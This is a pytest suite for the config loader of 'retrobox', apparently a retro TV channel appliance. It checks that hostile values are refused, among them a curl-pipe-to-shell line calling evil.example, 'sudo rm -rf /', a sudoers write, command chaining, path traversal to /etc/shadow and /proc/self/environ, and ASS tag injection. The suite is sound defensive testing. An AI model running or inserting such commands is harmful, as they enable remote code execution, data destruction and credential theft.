from pathlib import Path

import pytest

from retrobox.config import (
    DEFAULT_VIDEO_EXTENSIONS,
    INSTALL_ROOT,
    ConfigError,
    config_from_dict,
    load_config,
)
from retrobox.static_gen import DEFAULT_ASSETS_DIR
from tests.helpers import make_show


def test_explicit_channels(tmp_path):
    make_show(tmp_path, "adult-swim", 3)
    make_show(tmp_path, "latenight", 2)
    data = {
        "channels": [
            {"number": 2, "name": "Adult Swim", "path": str(tmp_path / "adult-swim")},
            {"number": 3, "name": "Late Night", "path": str(tmp_path / "latenight")},
        ]
    }
    cfg = config_from_dict(data)
    assert cfg.channel_numbers() == [2, 3]
    assert cfg.channels[0].name == "Adult Swim"
    assert cfg.tune_in == "random"  # default


def test_channel_number_and_name_defaults(tmp_path):
    make_show(tmp_path, "music_video_hits", 1)
    data = {"channels": [{"path": str(tmp_path / "music_video_hits")}]}
    cfg = config_from_dict(data)
    # number defaults to index+2, name derived + prettified from folder
    assert cfg.channels[0].number == 2
    assert cfg.channels[0].name == "Music Video Hits"


def test_media_root_autodiscovery(tmp_path):
    make_show(tmp_path, "adult swim", 1)
    make_show(tmp_path, "music videos", 1)
    make_show(tmp_path, "infomercials", 1)
    (tmp_path / ".hidden").mkdir()
    cfg = config_from_dict({"media_root": str(tmp_path)})
    # alphabetical order, numbered from 2, hidden folder ignored
    assert [(c.number, c.name) for c in cfg.channels] == [
        (2, "Adult Swim"),
        (3, "Infomercials"),
        (4, "Music Videos"),
    ]


def test_autodiscovery_custom_first_number(tmp_path):
    make_show(tmp_path, "latenight", 1)
    cfg = config_from_dict({"media_root": str(tmp_path), "first_channel_number": 7})
    assert cfg.channels[0].number == 7


def test_duplicate_channel_numbers_rejected(tmp_path):
    make_show(tmp_path, "a", 1)
    make_show(tmp_path, "b", 1)
    data = {
        "channels": [
            {"number": 5, "name": "A", "path": str(tmp_path / "a")},
            {"number": 5, "name": "B", "path": str(tmp_path / "b")},
        ]
    }
    with pytest.raises(ConfigError, match="duplicate channel number"):
        config_from_dict(data)


def test_missing_channels_and_media_root():
    with pytest.raises(ConfigError, match="either 'channels' or 'media_root'"):
        config_from_dict({})


def test_bad_tune_in_mode(tmp_path):
    make_show(tmp_path, "a", 1)
    data = {"tune_in": "nonsense", "channels": [{"path": str(tmp_path / "a")}]}
    with pytest.raises(ConfigError, match="tune_in"):
        config_from_dict(data)


def test_volume_and_durations_clamped(tmp_path):
    make_show(tmp_path, "a", 1)
    data = {
        "initial_volume": 500,
        "volume_step": 0,
        "transition_duration": -3,
        "channels": [{"path": str(tmp_path / "a")}],
    }
    cfg = config_from_dict(data)
    assert cfg.initial_volume == 100
    assert cfg.volume_step == 1
    assert cfg.transition_duration == 0.0


def test_video_extensions_normalised(tmp_path):
    make_show(tmp_path, "a", 1)
    data = {
        "video_extensions": ["mp4", ".MKV"],
        "channels": [{"path": str(tmp_path / "a")}],
    }
    cfg = config_from_dict(data)
    assert cfg.video_extensions == (".mp4", ".mkv")


def test_ui_and_crt_defaults(tmp_path):
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict({"channels": [{"path": str(tmp_path / "a")}]})
    assert cfg.ui.font == "VT323"
    assert cfg.ui.color == "#4DFF5A"
    assert cfg.crt.enabled is True
    assert cfg.force_4_3 is False   # shows keep their native aspect by default
    assert cfg.start_offset_min == 6.0
    assert cfg.start_offset_max == 10.0
    assert cfg.transition_effect == "none"
    assert cfg.transition_duration == 0.4
    assert cfg.bridge_seconds == 0.8


def test_start_offset_forms(tmp_path):
    make_show(tmp_path, "a", 1)
    base = {"channels": [{"path": str(tmp_path / "a")}]}
    # single number -> min == max
    c1 = config_from_dict({**base, "start_offset": 8})
    assert (c1.start_offset_min, c1.start_offset_max) == (8.0, 8.0)
    # [min, max] list
    c2 = config_from_dict({**base, "start_offset": [6, 10]})
    assert (c2.start_offset_min, c2.start_offset_max) == (6.0, 10.0)
    # explicit keys, and min/max get ordered
    c3 = config_from_dict({**base, "start_offset_min": 10, "start_offset_max": 6})
    assert (c3.start_offset_min, c3.start_offset_max) == (10.0, 10.0)


def test_ui_and_crt_overrides(tmp_path):
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict(
        {
            "channels": [{"path": str(tmp_path / "a")}],
            "ui": {"font": "Press Start 2P", "color": "00FF00", "glow": False},
            "crt": {"enabled": False, "curvature": 0.2, "scanlines": False},
        }
    )
    assert cfg.ui.font == "Press Start 2P"
    assert cfg.ui.color == "#00FF00"  # normalised with leading '#'
    assert cfg.ui.glow is False
    assert cfg.crt.enabled is False
    assert cfg.crt.curvature == 0.2
    assert cfg.crt.scanlines is False


def test_crt_values_clamped(tmp_path):
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict(
        {
            "channels": [{"path": str(tmp_path / "a")}],
            "crt": {"curvature": 5.0, "vignette": -1},
        }
    )
    assert cfg.crt.curvature == 0.5   # clamped to max
    assert cfg.crt.vignette == 0.0    # clamped to min


def test_bad_transition_rejected(tmp_path):
    make_show(tmp_path, "a", 1)
    with pytest.raises(ConfigError, match="transition"):
        config_from_dict(
            {"channels": [{"path": str(tmp_path / "a")}], "transition": "sparkles"}
        )


def test_bad_color_rejected(tmp_path):
    make_show(tmp_path, "a", 1)
    with pytest.raises(ConfigError, match="ui.color"):
        config_from_dict(
            {"channels": [{"path": str(tmp_path / "a")}], "ui": {"color": "greenish"}}
        )


def test_load_config_from_file(tmp_path):
    make_show(tmp_path, "latenight", 1)
    cfg_file = tmp_path / "config.yaml"
    cfg_file.write_text(
        "channels:\n"
        f"  - path: {tmp_path / 'latenight'}\n"
        "    name: Late Night\n"
        "    number: 3\n"
        "tune_in: resume\n"
    )
    cfg = load_config(cfg_file)
    assert cfg.tune_in == "resume"
    assert cfg.channels[0].number == 3


def test_load_config_missing_file(tmp_path):
    with pytest.raises(ConfigError, match="not found"):
        load_config(tmp_path / "nope.yaml")


def test_relative_paths_resolved_against_config_dir(tmp_path):
    make_show(tmp_path, "latenight", 1)
    cfg_file = tmp_path / "config.yaml"
    cfg_file.write_text("channels:\n  - path: latenight\n    name: Late Night\n")
    cfg = load_config(cfg_file)
    assert cfg.channels[0].path == tmp_path / "latenight"


# --------------------------------------------------------------------------
# Sleep timer
# --------------------------------------------------------------------------
def _cfg(tmp_path, **extra):
    make_show(tmp_path, "latenight", 1)
    data = {"channels": [{"number": 2, "name": "Late Night",
                          "path": str(tmp_path / "latenight")}]}
    data.update(extra)
    return config_from_dict(data)


def test_sleep_timer_defaults_to_the_classic_ladder(tmp_path):
    assert _cfg(tmp_path).sleep_steps == (30, 60, 90)
    assert _cfg(tmp_path).sleep_action == "standby"


def test_sleep_timer_accepts_a_custom_ladder(tmp_path):
    assert _cfg(tmp_path, sleep_timer=[15, 45]).sleep_steps == (15, 45)


def test_sleep_timer_accepts_a_single_number(tmp_path):
    assert _cfg(tmp_path, sleep_timer=20).sleep_steps == (20,)


def test_sleep_timer_can_be_switched_off(tmp_path):
    assert _cfg(tmp_path, sleep_timer=False).sleep_steps == ()
    assert _cfg(tmp_path, sleep_timer=[]).sleep_steps == ()


def test_sleep_timer_dedupes_and_clamps(tmp_path):
    # Duplicates would make the cycle stall on the same duration.
    assert _cfg(tmp_path, sleep_timer=[30, 30, 60]).sleep_steps == (30, 60)
    assert _cfg(tmp_path, sleep_timer=[0, 5000]).sleep_steps == (1, 1440)


def test_sleep_timer_rejects_nonsense(tmp_path):
    with pytest.raises(ConfigError, match="sleep_timer"):
        _cfg(tmp_path, sleep_timer={"nope": 1})


def test_sleep_action_is_validated(tmp_path):
    assert _cfg(tmp_path, sleep_action="off").sleep_action == "off"
    with pytest.raises(ConfigError, match="sleep_action"):
        _cfg(tmp_path, sleep_action="explode")


# --------------------------------------------------------------------------
# The power-off command
#
# This value is handed straight to subprocess.Popen by app.py, and the config
# it comes from can be replaced from a dashboard that has no password. So the
# rule lives here in the loader rather than in any one route: whatever way a
# document reaches this function - hand edited on the box, uploaded, restored
# from the backup, written back by an update - the argv that comes out the
# other side is one of the handful this box is willing to run.
# --------------------------------------------------------------------------
def test_the_power_off_command_defaults_to_a_plain_sudo_poweroff(tmp_path):
    assert _cfg(tmp_path).power_off_command == ("sudo", "poweroff")


@pytest.mark.parametrize(
    "written, expected",
    [
        ([], ()),                                        # "disabled" - tests use this
        (["sudo", "poweroff"], ("sudo", "poweroff")),
        ("sudo poweroff", ("sudo", "poweroff")),
        (["poweroff"], ("poweroff",)),
        (["sudo", "-n", "poweroff"], ("sudo", "-n", "poweroff")),
        (["sudo", "systemctl", "poweroff"], ("sudo", "systemctl", "poweroff")),
        (["sudo", "shutdown", "-h", "now"], ("sudo", "shutdown", "-h", "now")),
        (["/sbin/poweroff"], ("/sbin/poweroff",)),
        (["sudo", "/usr/sbin/poweroff"], ("sudo", "/usr/sbin/poweroff")),
    ],
)
def test_the_ordinary_ways_to_switch_a_machine_off_are_all_kept(
    tmp_path, written, expected
):
    assert _cfg(tmp_path, power_off_command=written).power_off_command == expected


@pytest.mark.parametrize(
    "hostile",
    [
        ["/bin/sh", "-c", "curl http://evil.example/x | sh"],
        ["sh", "-c", "id > /tmp/pwned"],
        ["bash", "-c", ":"],
        ["python3", "-c", "import os; os.system('id')"],
        ["sudo", "rm", "-rf", "/"],
        ["sudo", "systemctl", "start", "evil.service"],
        ["sudo", "tee", "/etc/sudoers.d/evil"],
        ["poweroff; curl http://evil.example"],
        "/bin/sh -c whoami",
        ["sudo", "poweroff", "&&", "curl", "http://evil.example"],
        ["/home/pi/uploads/payload.sh"],
        ["sudo", "-n", "systemctl", "poweroff", "--", "extra"],
    ],
)
def test_a_power_off_command_that_is_not_a_shutdown_never_reaches_the_box(
    tmp_path, hostile
):
    """Anything that is not on the list is dropped, whatever it looks like.

    Not fatal on purpose - see the loader. A box in somebody's living room
    that refuses to boot cannot be rescued, so the value is thrown away and
    the default is used instead. What must never happen is that argv reaching
    subprocess.Popen.
    """
    cfg = _cfg(tmp_path, power_off_command=hostile)
    assert cfg.power_off_command == ("sudo", "poweroff")
    assert cfg.power_off_command_refused, "the box should record what it dropped"


def test_a_refused_power_off_command_still_leaves_a_bootable_box(tmp_path):
    # The whole config still loads: only the one value was thrown away.
    cfg = _cfg(tmp_path, power_off_command=["/bin/sh", "-c", "id"])
    assert cfg.channels, "a bad power_off_command must not cost the customer the TV"


def test_a_good_power_off_command_is_not_flagged_as_refused(tmp_path):
    assert _cfg(tmp_path, power_off_command=[]).power_off_command_refused is None
    assert _cfg(tmp_path).power_off_command_refused is None


# --------------------------------------------------------------------------
# Bumpers and guide
# --------------------------------------------------------------------------
def test_bumpers_path_is_resolved(tmp_path):
    cfg = _cfg(tmp_path, bumpers=str(tmp_path / "bumps"))
    assert cfg.bumpers_dir == tmp_path / "bumps"


def test_bumpers_default_to_off(tmp_path):
    cfg = _cfg(tmp_path)
    assert cfg.bumpers_dir is None
    assert cfg.bumper_chance == 1.0


def test_bumper_chance_is_clamped(tmp_path):
    assert _cfg(tmp_path, bumper_chance=5).bumper_chance == 1.0
    assert _cfg(tmp_path, bumper_chance=-1).bumper_chance == 0.0
    assert _cfg(tmp_path, bumper_chance=0.25).bumper_chance == 0.25


def test_bumper_max_seconds_is_clamped(tmp_path):
    assert _cfg(tmp_path, bumper_max_seconds=9999).bumper_max_seconds == 300.0
    assert _cfg(tmp_path, bumper_max_seconds=0).bumper_max_seconds == 0.5


def test_guide_seconds_default_and_clamp(tmp_path):
    assert _cfg(tmp_path).guide_seconds == 8.0
    assert _cfg(tmp_path, guide_seconds=500).guide_seconds == 120.0


# --------------------------------------------------------------------------
# Dashboard upload limits
# --------------------------------------------------------------------------
def test_upload_limits_have_defaults(tmp_path):
    cfg = _cfg(tmp_path)
    assert cfg.web.max_upload_mb == 8192
    assert cfg.web.min_free_mb == 1024


def test_upload_limits_can_be_set(tmp_path):
    cfg = _cfg(tmp_path, web={"max_upload_mb": 500, "min_free_mb": 200})
    assert cfg.web.max_upload_mb == 500
    assert cfg.web.min_free_mb == 200


def test_upload_limits_are_clamped_to_something_sane(tmp_path):
    # 0 free space required would let the dashboard fill the root filesystem,
    # which is a bricked box; a 0 MB cap would make uploading impossible.
    assert _cfg(tmp_path, web={"min_free_mb": 0}).web.min_free_mb == 64
    assert _cfg(tmp_path, web={"max_upload_mb": 0}).web.max_upload_mb == 1


def test_a_web_section_that_is_not_a_mapping_is_an_error(tmp_path):
    with pytest.raises(ConfigError):
        _cfg(tmp_path, web="yes please")


def test_upload_session_limits_have_defaults(tmp_path):
    web = _cfg(tmp_path).web
    assert web.chunk_mb == 8
    assert web.max_files_per_upload == 500
    assert web.max_upload_sessions == 4
    assert web.upload_expiry_hours == 24


def test_upload_session_limits_can_be_set(tmp_path):
    web = _cfg(tmp_path, web={
        "chunk_mb": 2, "max_files_per_upload": 20,
        "max_upload_sessions": 1, "upload_expiry_hours": 6,
    }).web
    assert (web.chunk_mb, web.max_files_per_upload) == (2, 20)
    assert (web.max_upload_sessions, web.upload_expiry_hours) == (1, 6)


def test_upload_session_limits_are_clamped(tmp_path):
    # Zero of any of these makes uploading impossible rather than unlimited.
    web = _cfg(tmp_path, web={
        "chunk_mb": 0, "max_files_per_upload": 0,
        "max_upload_sessions": 0, "upload_expiry_hours": 0,
    }).web
    assert web.chunk_mb == 1
    assert web.max_files_per_upload == 1
    assert web.max_upload_sessions == 1
    assert web.upload_expiry_hours == 1


# --------------------------------------------------------------------------
# Updates
# --------------------------------------------------------------------------
def test_update_checking_is_on_and_applying_is_off_by_default(tmp_path):
    updates = _cfg(tmp_path).updates
    assert updates.check is True
    assert updates.auto_apply is False, (
        "a fleet that self-applies loses every unit to one bad tag at once"
    )
    assert updates.check_interval_hours == 24


def test_update_checking_can_be_turned_off_entirely(tmp_path):
    cfg = _cfg(tmp_path, updates={"check": False})
    assert cfg.updates.check is False


def test_update_settings_are_clamped(tmp_path):
    assert _cfg(tmp_path, updates={"check_interval_hours": 0}).updates.check_interval_hours == 1
    assert _cfg(tmp_path, updates={"check_interval_hours": 10**6}).updates.check_interval_hours == 720


def test_an_updates_section_that_is_not_a_mapping_is_an_error(tmp_path):
    with pytest.raises(ConfigError):
        _cfg(tmp_path, updates="please")


# ==========================================================================
# The two kinds of config value that can hurt somebody
#
# Everything below is one class of bug, not a list of fields: a value in
# config.yaml that becomes either (a) the argv of a subprocess or (b) a folder
# this box reads, writes or deletes inside. config.yaml can be replaced
# wholesale from a dashboard with no password on it, so both kinds are settled
# here in the loader - the one place uploads, backup restores, factory resets
# and hand-edited files all go through.
# ==========================================================================
def _with_channel(tmp_path, **extra):
    """A config that would boot, plus whatever the test is really about."""
    make_show(tmp_path, "sitcoms", 1)
    data = {"channels": [{"number": 2, "name": "Sitcoms",
                          "path": str(tmp_path / "sitcoms")}]}
    data.update(extra)
    return config_from_dict(data)


def test_a_clean_config_refuses_nothing(tmp_path):
    assert _with_channel(tmp_path).refusals == ()


# -- (b) folders the box reads, writes and deletes inside -------------------
def test_a_media_root_pointed_at_the_users_home_folder_is_refused(tmp_path):
    """Step two of the upload chain: make the home directory the library.

    Every sub-folder of media_root becomes a channel, and a channel folder is
    where /api/media and /api/uploads read, write and delete. Pointed at the
    home directory that is the whole of the box user's account.
    """
    cfg = _with_channel(tmp_path, media_root=str(Path.home()))
    assert cfg.media_root is None, "the home directory became the media library"
    assert any("media_root" in r for r in cfg.refusals)
    assert [c.name for c in cfg.channels] == ["Sitcoms"], "the box stopped booting"


def test_a_media_root_inside_the_installed_software_is_refused(tmp_path):
    """Step one of the chain that ends with retrobox/app.py being replaced."""
    cfg = _with_channel(tmp_path, media_root=str(INSTALL_ROOT))
    assert cfg.media_root is None
    assert any("media_root" in r for r in cfg.refusals)


@pytest.mark.parametrize(
    "folder",
    [
        "/mnt/usb/Shows",            # a drive plugged into the back
        "/media/retrobox",           # what the installer creates
        "/media/pi/MY DRIVE/TV",     # an automounted USB stick
        "/srv/media/tv",             # a NAS-style layout
        "/mnt/nas/Cartoons",         # an NFS or SMB mount
        "/data/library",             # somebody's own partition
    ],
)
def test_the_layouts_a_real_customer_uses_are_still_allowed(folder):
    """The other half of the trade. Getting this wrong is a truck roll."""
    cfg = config_from_dict({"channels": [{"number": 2, "name": "X", "path": folder}]})
    assert cfg.refusals == (), f"{folder} is a normal place to keep videos"


def test_a_videos_folder_in_the_box_users_own_home_is_still_allowed():
    home_videos = str(Path.home() / "Videos")
    cfg = config_from_dict({"channels": [{"number": 2, "name": "X", "path": home_videos}]})
    assert cfg.refusals == ()


@pytest.mark.parametrize(
    "folder",
    ["/etc", "/boot", "/usr/lib/systemd/system", "/etc/sudoers.d", "/root",
     "/var/spool/cron/crontabs", "/", "/home"],
)
def test_a_channel_folder_in_a_sensitive_place_is_dropped(tmp_path, folder):
    make_show(tmp_path, "sitcoms", 1)
    cfg = config_from_dict({"channels": [
        {"number": 2, "name": "Sitcoms", "path": str(tmp_path / "sitcoms")},
        {"number": 3, "name": "Nope", "path": folder},
    ]})
    assert cfg.channel_numbers() == [2], f"{folder} became a channel"
    assert cfg.refusals


def test_a_channel_folder_among_the_box_users_dotfiles_is_dropped(tmp_path):
    """~/.ssh, ~/.config/systemd/user, ~/.bashrc - the quiet ways in."""
    make_show(tmp_path, "sitcoms", 1)
    cfg = config_from_dict({"channels": [
        {"number": 2, "name": "Sitcoms", "path": str(tmp_path / "sitcoms")},
        {"number": 3, "name": "Nope", "path": str(Path.home() / ".config" / "systemd")},
    ]})
    assert cfg.channel_numbers() == [2]
    assert cfg.refusals


def test_a_symlink_out_of_the_media_root_does_not_become_a_channel(tmp_path):
    """The folder scanner follows symlinks, so the check has to as well."""
    root = tmp_path / "media"
    make_show(root, "sitcoms", 1)
    (root / "escape").symlink_to("/etc")
    cfg = config_from_dict({"media_root": str(root)})
    assert [c.name for c in cfg.channels] == ["Sitcoms"]
    assert cfg.refusals


def test_a_daypart_folder_in_a_sensitive_place_is_dropped(tmp_path):
    make_show(tmp_path, "sitcoms", 1)
    cfg = config_from_dict({"channels": [{
        "number": 2, "name": "Sitcoms", "path": str(tmp_path / "sitcoms"),
        "dayparts": [{"from": "18:00", "to": "20:00", "path": "/etc"}],
    }]})
    assert cfg.channels[0].dayparts == ()
    assert cfg.refusals


def test_a_bumpers_folder_in_a_sensitive_place_is_refused(tmp_path):
    cfg = _with_channel(tmp_path, bumpers="/etc")
    assert cfg.bumpers_dir is None
    assert any("bumpers" in r for r in cfg.refusals)


def test_an_ordinary_bumpers_folder_still_works(tmp_path):
    cfg = _with_channel(tmp_path, bumpers=str(tmp_path / "idents"))
    assert cfg.bumpers_dir == tmp_path / "idents"
    assert cfg.refusals == ()


def test_an_assets_dir_in_a_sensitive_place_is_refused(tmp_path):
    """assets_dir is a folder this box WRITES a fixed-name video into.

    /api/branding/splash and /api/filler/generate both put files there, so it
    is an arbitrary-directory write unless it is checked here.
    """
    cfg = _with_channel(tmp_path, assets_dir=str(Path.home()))
    assert cfg.assets_dir is None
    assert any("assets_dir" in r for r in cfg.refusals)


def test_the_bundled_assets_folder_is_still_a_legal_assets_dir(tmp_path):
    """It lives inside the installed software, and it is where the clips are."""
    cfg = _with_channel(tmp_path, assets_dir=str(DEFAULT_ASSETS_DIR))
    assert cfg.assets_dir == DEFAULT_ASSETS_DIR
    assert cfg.refusals == ()


@pytest.mark.parametrize(
    "hostile", ["/etc/shadow", "../../etc/passwd", "payload.sh", "/proc/self/environ"]
)
def test_a_boot_splash_that_is_not_a_video_file_is_refused(tmp_path, hostile):
    cfg = _with_channel(tmp_path, boot_splash=hostile)
    assert cfg.boot_splash is None
    assert any("boot_splash" in r for r in cfg.refusals)


def test_an_ordinary_boot_splash_still_works(tmp_path):
    assert _with_channel(tmp_path, boot_splash="my_own.mp4").boot_splash.name == "my_own.mp4"
    assert _with_channel(tmp_path, boot_splash="my_own.mp4").refusals == ()


# -- video_extensions: what a media extension actually looks like -----------
@pytest.mark.parametrize(
    "hostile",
    [[".py"], [".sh"], [".service"], [".yaml"], [".so"], [".pth"], [".desktop"],
     [".conf"], [".bashrc"], [".timer"], [".rules"], ["py"], [".MP4.py"],
     [".mp4", ".py"], ["."], [".."], [".mp4/../x"]],
)
def test_a_video_extension_that_is_not_a_video_is_refused(tmp_path, hostile):
    """The other half of the source-tree overwrite: making .py a "video".

    safe_media_name asks config.video_extensions what a video is, so an
    attacker who can add one suffix to that list can upload that kind of file.
    """
    cfg = _with_channel(tmp_path, video_extensions=hostile)
    assert cfg.video_extensions == DEFAULT_VIDEO_EXTENSIONS
    assert any("video_extensions" in r for r in cfg.refusals)


def test_the_ordinary_video_containers_are_still_accepted(tmp_path):
    cfg = _with_channel(
        tmp_path, video_extensions=["mp4", ".MKV", ".avi", ".m2ts", ".vob", ".ogv"]
    )
    assert cfg.video_extensions == (".mp4", ".mkv", ".avi", ".m2ts", ".vob", ".ogv")
    assert cfg.refusals == ()


# -- (a) values that become argv ------------------------------------------
@pytest.mark.parametrize(
    "hostile",
    ["/bin/sh", "bash", "python3", "curl", "/home/pi/payload.sh",
     "cec-client; id", "../../bin/sh", "/usr/bin/env", "sudo", ""],
)
def test_a_cec_binary_that_is_not_the_cec_client_never_reaches_the_input_manager(
    tmp_path, hostile
):
    """The second value that becomes argv[0], next to power_off_command.

    input/manager.py hands cec_binary to CecBackend, which runs it through
    subprocess.Popen. Today shutil.which() has to find it first; that is one
    chmod away from being the power_off_command hole again.
    """
    cfg = _with_channel(tmp_path, input={"cec_binary": hostile})
    assert "cec_binary" not in cfg.input_options
    assert any("cec_binary" in r for r in cfg.refusals)


@pytest.mark.parametrize(
    "binary", ["cec-client", "/usr/bin/cec-client", "/usr/local/bin/cec-client",
               "cec-client-6.0.2"],
)
def test_the_real_cec_client_is_still_accepted(tmp_path, binary):
    cfg = _with_channel(tmp_path, input={"cec_binary": binary})
    assert cfg.input_options["cec_binary"] == binary
    assert cfg.refusals == ()


@pytest.mark.parametrize(
    "hostile", ["-o", "--help", "-d 8 -o /etc/x", "Retro\nBox", "x" * 60],
)
def test_a_cec_osd_name_cannot_become_another_command_line_argument(tmp_path, hostile):
    cfg = _with_channel(tmp_path, input={"cec_osd_name": hostile})
    assert "cec_osd_name" not in cfg.input_options
    assert any("cec_osd_name" in r for r in cfg.refusals)


def test_an_ordinary_cec_osd_name_is_kept(tmp_path):
    cfg = _with_channel(tmp_path, input={"cec_osd_name": "Retro Box"})
    assert cfg.input_options["cec_osd_name"] == "Retro Box"
    assert cfg.refusals == ()


@pytest.mark.parametrize(
    "hostile", [["/etc/shadow"], ["/home/pi/notes"], ["/dev/../etc/shadow"], ["relative"]]
)
def test_keyboard_devices_outside_dev_input_are_refused(tmp_path, hostile):
    cfg = _with_channel(tmp_path, input={"keyboard_devices": hostile})
    assert "keyboard_devices" not in cfg.input_options
    assert any("keyboard_devices" in r for r in cfg.refusals)


def test_real_input_devices_are_still_accepted(tmp_path):
    cfg = _with_channel(
        tmp_path, input={"keyboard_devices": ["/dev/input/event0", "/dev/input/by-id/x"]}
    )
    assert cfg.input_options["keyboard_devices"] == ["/dev/input/event0",
                                                     "/dev/input/by-id/x"]
    assert cfg.refusals == ()


def test_a_control_socket_path_that_would_delete_the_software_is_refused(tmp_path):
    """input/web.py unlinks whatever this names before it binds."""
    cfg = _with_channel(
        tmp_path, input={"web_socket": str(INSTALL_ROOT / "retrobox" / "app.py")}
    )
    assert "web_socket" not in cfg.input_options
    assert any("web_socket" in r for r in cfg.refusals)


@pytest.mark.parametrize(
    "socket_path",
    [
        "/run/user/1000/retrobox/control.sock",   # where systemd puts it
        "/tmp/retrobox/control.sock",             # and where it goes without
    ],
)
def test_the_places_the_control_socket_really_lives_are_kept(tmp_path, socket_path):
    cfg = _with_channel(tmp_path, input={"web_socket": socket_path})
    assert cfg.input_options["web_socket"] == socket_path
    assert cfg.refusals == ()


def test_an_ordinary_control_socket_path_is_kept(tmp_path):
    cfg = _with_channel(tmp_path, input={"web_socket": str(tmp_path / "control.sock")})
    assert cfg.input_options["web_socket"] == str(tmp_path / "control.sock")
    assert cfg.refusals == ()


# -- the on-screen display -------------------------------------------------
@pytest.mark.parametrize(
    "hostile",
    [r"VT323}\c&H0000FF&{", r"VT323\N", "a{b}", "x" * 100, "VT323\n", "VT323\\"],
)
def test_a_ui_font_cannot_smuggle_further_ass_tags_onto_the_screen(tmp_path, hostile):
    """overlay.py splices ui.font into an ASS override block.

    A '}' or a backslash closes that block and opens another one, so the font
    name can rewrite the on-screen display. No code runs, but it is somebody
    else's television.
    """
    cfg = _with_channel(tmp_path, ui={"font": hostile})
    assert cfg.ui.font == "VT323"
    assert any("ui.font" in r for r in cfg.refusals)


@pytest.mark.parametrize(
    "font", ["VT323", "DejaVu Sans Mono", "Press Start 2P", "Roboto-Regular"]
)
def test_ordinary_font_names_are_kept(tmp_path, font):
    cfg = _with_channel(tmp_path, ui={"font": font})
    assert cfg.ui.font == font
    assert cfg.refusals == ()


# -- the principle: a refused value must never cost somebody the picture ---
def test_a_config_full_of_refused_values_still_produces_a_working_television(tmp_path):
    make_show(tmp_path, "sitcoms", 1)
    cfg = config_from_dict({
        "media_root": str(Path.home()),
        "video_extensions": [".py"],
        "assets_dir": "/etc",
        "bumpers": "/boot",
        "boot_splash": "/etc/shadow",
        "power_off_command": ["/bin/sh", "-c", "id"],
        "ui": {"font": "x}\\c&HFF&{"},
        "input": {"cec_binary": "/bin/sh", "cec_osd_name": "-o"},
        "channels": [{"number": 2, "name": "Sitcoms", "path": str(tmp_path / "sitcoms")}],
    })
    assert [c.name for c in cfg.channels] == ["Sitcoms"]
    assert cfg.video_extensions == DEFAULT_VIDEO_EXTENSIONS
    assert cfg.power_off_command == ("sudo", "poweroff")
    assert len(cfg.refusals) >= 8, cfg.refusals


def test_the_shape_the_installer_writes_is_accepted_exactly_as_written(tmp_path):
    """installer/provision.sh writes this, on every unattended box.

    Note the DOT folder: auto_channels skips hidden folders, so the installer
    parks the placeholder channel in one on purpose. Refusing hidden folders
    outright would brick every provisioned unit, which is why the dotfile rule
    below only applies under the box user's home.
    """
    root = tmp_path / "media" / "retrobox"
    (root / ".welcome").mkdir(parents=True)
    cfg = config_from_dict({
        "media_root": str(root),
        "auto_channels": True,
        "channels": [{"number": 2, "name": "Retro Box", "path": str(root / ".welcome")}],
    })
    assert cfg.media_root == root
    assert [c.number for c in cfg.channels] == [2]
    assert cfg.refusals == ()


def test_the_config_that_ships_with_the_box_refuses_nothing():
    """The example file is what a customer starts from and edits.

    If a rule here ever refused something in it, every box built from it would
    come up with settings the file plainly asked for and did not get.
    """
    example = INSTALL_ROOT / "config.example.yaml"
    cfg = load_config(example)
    assert cfg.refusals == (), cfg.refusals


# --- going quiet when there is no television watching -----------------------
def test_going_quiet_is_off_by_default_until_the_dashboard_half_ships(tmp_path):
    """Deliberate, and this test is the record of the decision.

    Every box already sold updates itself. On by default means every one of
    them starts pausing its own picture the moment it updates - BEFORE there
    is any dashboard showing that the box has gone quiet, and before there is
    a Wake button to undo it. These are appliances with no SSH, switched off
    at the wall by people who did not ask for a new behaviour, and the failure
    mode is a black screen in front of a working television with nothing on
    the dashboard connecting the two.

    Whoever ships the dashboard half flips this default and this test with it.
    """
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict({"channels": [{"path": str(tmp_path / "a")}]})
    assert cfg.display_sleep.enabled is False
    assert cfg.display_sleep.sleep_after_seconds == 8.0
    assert cfg.display_sleep.non_broadcast == "resume"


def test_a_box_that_asks_for_going_quiet_gets_it(tmp_path):
    """Off by DEFAULT is not off: the whole feature still works when asked for."""
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict({
        "channels": [{"path": str(tmp_path / "a")}],
        "display_sleep": {"enabled": True},
    })
    assert cfg.display_sleep.enabled is True


def test_the_config_says_plainly_why_going_quiet_is_off_and_what_turns_it_on(tmp_path):
    """A default nobody can find the reason for gets flipped back by accident.

    The reason is the dashboard, so the word has to appear next to the
    setting - in the class the code reads and in the file the owner reads.
    """
    from retrobox.config import DisplaySleepConfig

    assert "dashboard" in (DisplaySleepConfig.__doc__ or "").lower()

    example = (INSTALL_ROOT / "config.example.yaml").read_text(encoding="utf-8")
    block = example.split("display_sleep:", 1)[1].split("\n\n", 1)[0]
    assert "enabled: false" in block
    assert "dashboard" in block.lower()


def test_the_owner_can_say_how_long_the_display_must_be_gone(tmp_path):
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict({
        "channels": [{"path": str(tmp_path / "a")}],
        "display_sleep": {
            "enabled": False, "sleep_after_seconds": 45, "non_broadcast": "advance",
        },
    })
    assert cfg.display_sleep.enabled is False
    assert cfg.display_sleep.sleep_after_seconds == 45.0
    assert cfg.display_sleep.non_broadcast == "advance"


def test_an_absurd_wait_before_going_quiet_is_brought_back_into_range(tmp_path):
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict({
        "channels": [{"path": str(tmp_path / "a")}],
        "display_sleep": {"sleep_after_seconds": 99999},
    })
    assert cfg.display_sleep.sleep_after_seconds == 3600.0


def test_a_wake_behaviour_nobody_implemented_falls_back_instead_of_refusing_to_boot(
    tmp_path,
):
    """A typo in this file must never cost somebody their television."""
    make_show(tmp_path, "a", 1)
    cfg = config_from_dict({
        "channels": [{"path": str(tmp_path / "a")}],
        "display_sleep": {"non_broadcast": "teleport"},
    })
    assert cfg.display_sleep.non_broadcast == "resume"


def test_a_display_sleep_block_that_is_not_a_block_at_all_is_refused(tmp_path):
    make_show(tmp_path, "a", 1)
    with pytest.raises(ConfigError, match="display_sleep"):
        config_from_dict({
            "channels": [{"path": str(tmp_path / "a")}],
            "display_sleep": "yes please",
        })
